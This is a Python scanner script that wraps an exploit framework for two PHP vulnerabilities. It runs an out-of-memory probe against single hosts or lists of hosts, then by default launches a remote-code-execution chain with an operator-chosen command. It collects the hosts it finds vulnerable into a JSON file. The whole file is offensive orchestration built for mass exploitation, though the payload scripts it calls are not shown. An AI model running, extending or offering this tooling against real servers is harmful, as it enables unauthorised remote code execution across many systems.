#!/usr/bin/env python3
"""PHP2Shell Multi-Mode PoC — CVE-2026-109618/119 (Ikow / multi-chain).

Wraps xplotas/php2shell/xplota_6/ for the Xplota UI.
Three independent exploitation chains in one repo:
  - chain_a: Session LFI (session file poisoning via upload_progress)
  - chain_c: Handler mismatch RCE
  - poc:     OOM trigger verification

Runs the OOM verification probe (verify_oom_trigger.py) for detection,
then optionally the full chain_c for RCE.

Usage:
    python3 scanner.py -u https://target.com -o results.json
    python3 scanner.py -l hosts.txt -o results.json
"""
from __future__ import annotations

import argparse, json, os, subprocess, sys, threading, time
from pathlib import Path
from typing import Any
from urllib.parse import urlsplit

CVES = "CVE-2026-109618 / CVE-2026-109619"
_HERE = Path(__file__).resolve().parent
_BASE = _HERE.parents[2] / "xplotas" / "php2shell" / "xplota_6"
_OOM_PROBE = _BASE / "poc" / "verify_oom_trigger.py"
_CHAIN_C = _BASE / "exploit" / "chain_c_mismatch_rce.py"

_CRASH_MARKERS = ("Traceback", "RuntimeError:", "ConnectionRefusedError:", "TimeoutError:")


def _parse_url(raw: str) -> str:
    raw = raw.strip()
    if "://" not in raw:
        raw = "http://" + raw
    return raw


def _run_script(script: Path, extra_args: list[str], timeout: int) -> tuple[int, str]:
    lines: list[str] = []
    exit_code = -3
    try:
        proc = subprocess.Popen(
            [sys.executable, "-u", str(script)] + extra_args,
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            cwd=str(script.parent), env={**os.environ, "PYTHONUNBUFFERED": "1"},
            text=True, encoding="utf-8", errors="replace")
        assert proc.stdout
        for line in proc.stdout:
            line = line.rstrip("\r\n")
            if line:
                print(f"[LOG] {line}", flush=True)
                lines.append(line)
        proc.wait(timeout=5)
        exit_code = proc.returncode
    except FileNotFoundError:
        lines.append(f"script not found: {script}")
    except Exception as exc:
        lines.append(str(exc))
    return exit_code, "\n".join(lines)


def _run(target: str, cmd: str, timeout: int, probe_only: bool) -> dict[str, Any]:
    url = _parse_url(target)
    t0 = time.monotonic()

    # Stage 1: OOM probe
    code1, out1 = _run_script(_OOM_PROBE, ["-u", url, "--timeout", str(timeout)], timeout)

    all_out = out1
    exit_code = code1

    is_crash = code1 == 1 and any(m in out1 for m in _CRASH_MARKERS)

    vuln: bool | None = None
    verdict = "INCONCLUSIVE"
    reason = "OOM probe inconclusive"

    if is_crash:
        reason = next((l.strip() for l in out1.splitlines() if any(m in l for m in _CRASH_MARKERS)),
                      "OOM probe crashed")
    elif code1 == 0:
        # Vulnerable — optionally run RCE chain
        if not probe_only and cmd is not None:
            rce_args = ["-u", url]
            if cmd:
                rce_args += ["--cmd", cmd]
            code2, out2 = _run_script(_CHAIN_C, rce_args, timeout)
            all_out += "\n" + out2
            if code2 == 0:
                vuln, verdict = True, "VULNERABLE"
                reason = next((l.split("]", 1)[-1].strip() for l in reversed(out2.splitlines())
                               if "[+]" in l), "Handler mismatch RCE succeeded")
            else:
                vuln, verdict = True, "VULNERABLE"
                reason = "OOM trigger confirmed; RCE chain inconclusive"
        else:
            vuln, verdict = True, "VULNERABLE"
            reason = "OOM trigger confirmed (probe-only mode)"
    else:
        vuln, verdict, reason = False, "NOT VULNERABLE", "OOM trigger not observed — target appears patched"

    bracket = "VULNERABLE" if vuln is True else ("NOT VULNERABLE" if vuln is False else "INCONCLUSIVE")
    print(f"[{bracket}] {target} - {reason}", flush=True)
    return {"target": target, "url": target, "tested_url": url,
            "vulnerable": vuln, "verdict": verdict, "reason": reason,
            "error": None, "elapsed": round(time.monotonic() - t0, 2),
            "exit_code": exit_code, "log": all_out[-4096:]}


def main() -> None:
    ap = argparse.ArgumentParser()
    g = ap.add_mutually_exclusive_group(required=True)
    g.add_argument("-u", "--url"); g.add_argument("-l", "--list")
    ap.add_argument("-o", "--output", required=True)
    ap.add_argument("-t", "--threads", type=int, default=5)
    ap.add_argument("--timeout", type=int, default=60)
    ap.add_argument("--no-color", action="store_true")
    ap.add_argument("--verbose", "-v", action="store_true")
    ap.add_argument("--all-results", action="store_true")
    ap.add_argument("--cmd", default=None, help="RCE command (None = probe only)")
    ap.add_argument("--probe-only", action="store_true", help="Only run OOM probe, skip RCE chain")
    args = ap.parse_args()

    targets = ([args.url.strip()] if args.url else
               [l.strip() for l in Path(args.list).read_text().splitlines()
                if l.strip() and not l.startswith("#")])
    if not targets: raise SystemExit("No targets")

    results: list[dict] = []
    lock = threading.Lock()

    def process(t: str) -> None:
        r = _run(t, args.cmd, args.timeout, args.probe_only)
        with lock:
            if args.all_results or r["vulnerable"] is not False:
                results.append(r)

    threads = min(args.threads, 10)
    if threads <= 1 or len(targets) == 1:
        for t in targets: process(t)
    else:
        from concurrent.futures import ThreadPoolExecutor, as_completed
        with ThreadPoolExecutor(max_workers=threads) as pool:
            for f in as_completed({pool.submit(process, t): t for t in targets}):
                try: f.result()
                except Exception as e: print(f"[ERROR] {e}", flush=True)

    Path(args.output).write_text(json.dumps(results, indent=2), encoding="utf-8")
    raise SystemExit(1 if any(r["vulnerable"] for r in results) else 0)


if __name__ == "__main__":
    main()
